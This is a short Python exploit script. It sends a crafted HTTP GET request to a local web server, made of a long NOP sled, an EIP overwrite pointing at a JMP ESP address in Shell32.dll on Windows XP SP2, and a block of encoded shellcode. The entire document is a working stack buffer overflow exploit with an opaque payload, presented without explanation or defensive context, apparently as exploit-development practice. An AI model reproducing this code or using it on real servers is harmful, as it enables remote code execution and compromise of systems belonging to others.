#exp5

#!/usr/bin/python
import socket

target_address="127.0.0.1"
target_port=80

buffer = "GET "
buffer+= "\x90" * 1787
buffer+= "\x65\x82\xA5\x7C" # EIP Overwrite. Shell32.dll, XP SP2, JMP ESP, 7CA58265.
buffer+= "\x90" * 16
buffer+= ("\xdb\xca\xd9\x74\x24\xf4\x58\xbb\x17\xb3\xcd\x3f\x2b\xc9\xb1"
"\x33\x31\x58\x17\x83\xe8\xfc\x03\x4f\xa0\x2f\xca\x93\x2e\x26"
"\x35\x6b\xaf\x59\xbf\x8e\x9e\x4b\xdb\xdb\xb3\x5b\xaf\x89\x3f"
"\x17\xfd\x39\xcb\x55\x2a\x4e\x7c\xd3\x0c\x61\x7d\xd5\x90\x2d"
"\xbd\x77\x6d\x2f\x92\x57\x4c\xe0\xe7\x96\x89\x1c\x07\xca\x42"
"\x6b\xba\xfb\xe7\x29\x07\xfd\x27\x26\x37\x85\x42\xf8\xcc\x3f"
"\x4c\x28\x7c\x4b\x06\xd0\xf6\x13\xb7\xe1\xdb\x47\x8b\xa8\x50"
"\xb3\x7f\x2b\xb1\x8d\x80\x1a\xfd\x42\xbf\x93\xf0\x9b\x87\x13"
"\xeb\xe9\xf3\x60\x96\xe9\xc7\x1b\x4c\x7f\xda\xbb\x07\x27\x3e"
"\x3a\xcb\xbe\xb5\x30\xa0\xb5\x92\x54\x37\x19\xa9\x60\xbc\x9c"
"\x7e\xe1\x86\xba\x5a\xaa\x5d\xa2\xfb\x16\x33\xdb\x1c\xfe\xec"
"\x79\x56\xec\xf9\xf8\x35\x7a\xff\x89\x43\xc3\xff\x91\x4b\x63"
"\x68\xa3\xc0\xec\xef\x3c\x03\x49\x1f\x77\x0e\xfb\x88\xde\xda"
"\xbe\xd4\xe0\x30\xfc\xe0\x62\xb1\x7c\x17\x7a\xb0\x79\x53\x3c"
"\x28\xf3\xcc\xa9\x4e\xa0\xed\xfb\x2c\x27\x7e\x67\x9d\xc2\x06"
"\x02\xe1")
buffer+= " HTTP/1.1\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()
